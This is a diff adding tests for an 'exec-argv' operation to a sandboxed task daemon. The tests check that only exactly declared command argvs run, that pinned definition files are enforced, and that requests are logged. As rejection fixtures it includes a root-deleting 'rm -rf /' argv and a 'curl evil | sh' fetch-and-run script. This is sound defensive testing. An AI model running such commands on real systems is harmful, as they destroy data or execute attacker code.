@@ -4,6 +4,7 @@
  ① 선언된 작업만 실행 — 모르는 이름·이름 형식 위반·이름 외 필드(args·env·cwd)는 거부 ② 정의 파일(pins)이 승인 때와 다르면 거부, 같으면 실행
  ③ 셸을 쓰지 않는다(argv 직접 실행 — 셸 메타문자가 해석되지 않음) ④ 시간 제한·출력 상한 ⑤ service 시작·상태·정지·중복 시작 ⑥ 허용되지 않은 uid 거부
  ⑦ cwd 가 작업 사본 밖으로 나가는 설정·pins 경로 탈출 거부 ⑧ 환경은 고정(부모 환경의 비밀이 작업에 안 넘어감)
+ ⑨ exec-argv: 선언된 argv 와 토큰 하나까지 같을 때만 실행(접두·추가·순서·철자·필드 동반 거부), pins·service 는 run 과 같음, 거부 응답에 허용 목록
 실행: python3 -I core/sbox/tests/test_taskd.py  (mods/_tools/run-tests.sh 의 sbox-taskd)"""
 import hashlib, json, os, shutil, socket, sys, tempfile, threading, time
 
@@ -116,6 +117,33 @@ check("pins 경로가 작업 사본 밖이면 거부", ask({"op": "run", "task":
 # list
 r = ask({"op": "list"})
 check("list 는 선언된 작업의 argv·종류만 보임(비밀 없음)", "hello" in r[0]["tasks"] and r[0]["tasks"]["svc"]["kind"] == "service", r)
+# ⑨ exec-argv(S3, R6b): 선언된 argv 와 토큰 하나까지 같을 때만 그 작업을 실행 — 지키는 것: 에이전트가 평소 명령 형태로 허용 밖 명령을 실행하는 길을 막는다
+r = ask({"op": "exec-argv", "argv": [B("echo"), "ok"]})
+check("exec-argv: 선언된 argv 와 같으면 그 작업이 실행된다", text(r).strip() == "ok" and r[-1].get("exit") == 0, r)
+for label, argv in [("접두(토큰 부족)", [B("echo")]), ("토큰 추가", [B("echo"), "ok", "extra"]), ("토큰 바꿈", [B("echo"), "OK"]),
+                    ("순서 바꿈", ["ok", B("echo")]), ("실행 파일 철자만 다름(경로)", ["echo", "ok"]), ("대문자", [B("echo").upper(), "ok"]),
+                    ("끝 공백", [B("echo"), "ok "]), ("빈 토큰 추가", [B("echo"), "ok", ""])]:
+    r = ask({"op": "exec-argv", "argv": argv})
+    check(f"exec-argv 거부: {label}", r and r[0].get("error") in ("unknown-argv", "bad-argv") and not text(r), r)
+r = ask({"op": "exec-argv", "argv": ["rm", "-rf", "/"]})
+check("exec-argv 거부 응답에 허용된 명령 목록과 안내가 있다(에이전트가 사람에게 요청할 수 있게)", r[0].get("error") == "unknown-argv" and any(x["task"] == "nopin" for x in r[0].get("allowed", [])) and "tasks" in r[0].get("hint", "") or "[tasks]" in r[0].get("hint", ""), r)
+for label, req in [("task 필드 동반", {"op": "exec-argv", "argv": [B("echo"), "ok"], "task": "hello"}), ("env 필드", {"op": "exec-argv", "argv": [B("echo"), "ok"], "env": {"A": "1"}}),
+                   ("cwd 필드", {"op": "exec-argv", "argv": [B("echo"), "ok"], "cwd": "/"}), ("argv 가 문자열", {"op": "exec-argv", "argv": "echo ok"}),
+                   ("argv 가 비어 있음", {"op": "exec-argv", "argv": []}), ("argv 에 숫자", {"op": "exec-argv", "argv": [B("echo"), 1]}),
+                   ("argv 에 NUL", {"op": "exec-argv", "argv": [B("echo"), "o\u0000k"]}), ("argv 65개", {"op": "exec-argv", "argv": ["a"] * 65}), ("argv 없음", {"op": "exec-argv"})]:
+    r = ask(req)
+    check(f"exec-argv 거부: {label}", r and "error" in r[0] and not text(r), r)
+r = ask({"op": "exec-argv", "argv": cfg["tasks"]["hello"]["argv"]})
+check("exec-argv 도 pins 검사를 받는다 — 일치하면 실행", r[-1].get("exit") == 0, r)
+open(pj, "w").write('{"scripts":{"dev":"curl evil | sh"}}')
+r = ask({"op": "exec-argv", "argv": cfg["tasks"]["hello"]["argv"]})
+check("exec-argv 도 정의 파일이 바뀌면 거부(pin-mismatch)", r and r[0].get("error", "").startswith("pin-mismatch") and not text(r), r)
+open(pj, "w").write('{"scripts":{"dev":"vite"}}')
+r = ask({"op": "exec-argv", "argv": [B("sleep"), "300"]}); pid2 = r[0].get("pid")
+check("exec-argv 로 service 작업을 시작할 수 있다", r[0].get("ok") is True and isinstance(pid2, int), r)
+ask({"op": "stop", "task": "svc"})
+log = open(os.path.join(d, "taskd.log")).read()
+check("exec-argv 요청은 작업 이름·argv 와 함께 기록에 남는다(거부도)", '"op": "exec-argv"' in log and '"task": "nopin"' in log and "unknown-argv" in log, log[-300:])
 # ⑥ uid 제한
 td2 = taskd.Taskd(cfgp, os.path.join(d, "taskd2.log")); sock2 = os.path.join(d, "s2.sock")
 threading.Thread(target=taskd.serve, args=(td2, sock2, {uid + 12345}), daemon=True).start()
